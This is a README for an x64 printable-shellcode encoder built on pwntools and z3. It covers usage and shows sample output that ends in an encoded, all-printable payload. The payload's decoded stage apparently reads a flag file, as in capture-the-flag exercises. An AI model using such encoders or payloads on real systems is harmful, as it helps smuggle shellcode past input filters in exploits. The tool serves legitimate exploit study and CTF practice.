# x64 printable shellcode encoder

### Dependencies
 - pwntools (`pip install pwntools`)
 - z3 python bindings (`pip install z3-solver`)

### Usage
`./main.py <shellcode file> <pointer to shellcode>`

For the encoded shellcode to work it needs to be able to know where it will execute. This is done by passing the encoder a pointer to your shellcode. This should be an expression that is the address of the start of the shellcode in the victim's address space. For example, if rdx happens to point to your shellcode, use `rdx`. If the shellcode is always at 0x4001000, specify that. Etc. Also, if you want to use a negative offset you must use `base+-offset`. This is because I hacked the parser together really quickly.

#### Examples
- `./main.py shellcode.bin rcx`
- `./main.py shellcode.bin [rsp+-8]`
- `./main.py shellcode.bin 0x0123456789abcdef`
- `./main.py shellcode.bin rbp+5`

### Example output
```
$ python main.py shellcode.bin rax+0x150
Encoding stage2
488b0432 => 4863343a31343a53582d702835332d74205f5f35543c6f5f505e31343a57582d7c6f3f7e2d405042402d40407e41505f
480faf44 => 4863343a31343a53582d505040792d743020693574703059505e31343a57582d7c6f3f7e2d405042402d40407e41505f
32084889 => 4863343a31343a53582d244874202d5f606c20354f5f5736505e31343a57582d7c6f3f7e2d405042402d40407e41505f
043a83c7 => 4863343a31343a53582d402233402d706020203554472f58505e31343a57582d7c6f3f7e2d405042402d40407e41505f
0883c610 => 4863343a31343a53582d403346322d7020207e35582f5f5f505e31343a57582d7c6f3f7e2d405042402d40407e41505f
85c075e8 => 4863343a31343a53582d204775202d202160403545575f77505e31343a57582d7c6f3f7e2d405042402d40407e41505f
Multiply-encoding stage3
eb365f31c0040231 => 45375d7168724246 6f4047487268284e
f60f054889c76681 => 456453557d232227 7e3e7d2d6b72697d
ecff0f4889e648c7 => 615a285150304752 6c3f4c4848644a47
c2ff0f000031c00f => 4178757b577d6869 423f6f5f41715055
0531ff4080c70148 => 3d7d537e307c7458 694f37294a726258
89c231c0ffc00f05 => 41233b202b406267 497538523e77406d
31ff31c0043c0f05 => 43667e753a6f6443 7b5f2c5b2b444651
e8c5ffffff2f7072 => 51424b2d33383b23 68457d3f3f2b7076
6f632f666c616700 => 5d774b667832573f 3b553d6f4d7e5b55
Assembling jump at +408

Encoding preamble for rdx <- rax+0x150
PPTAYAXVI31VXXXf-0~f-@Bf-@>PZ

Original length: 72
Encoded length:  556
Preamble length: 29
Total length:    585

PPTAYAXVI31VXXXf-0~f-@Bf-@>PZTAYAXVI31VXPP[_Hc4:14:SX-p(53-t __5T<o_P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-PP@y-t0 i5tp0YP^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-$Ht -_`l 5O_W6P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-@"3@-p`  5TG/XP^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-@3F2-p  ~5X/__P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX- Gu - !`@5EW_wP^14:WX-|o?~-@PB@-@@~AP_SX- `Ba- @BA5X^{]P_Hc4:14:SX-*90 -E'  5n}?/P^14:WX-|o?~-@PB@-@@~AP_SX- `@a- @PA5\^o]P^SX-@@@"-y``~5____P_AAAAE7]qhrBFo@GHrh(NEdSU}#"'~>}-kri}aZ(QP0GRl?LHHdJGAxu{W}hiB?o_AqPU=}S~0|tXiO7)JrbXA#; +@bgIu8R>w@mCf~u:odC{_,[+DFQQBK-38;#hE}??+pv]wKfx2W?;U=oM~[U
```
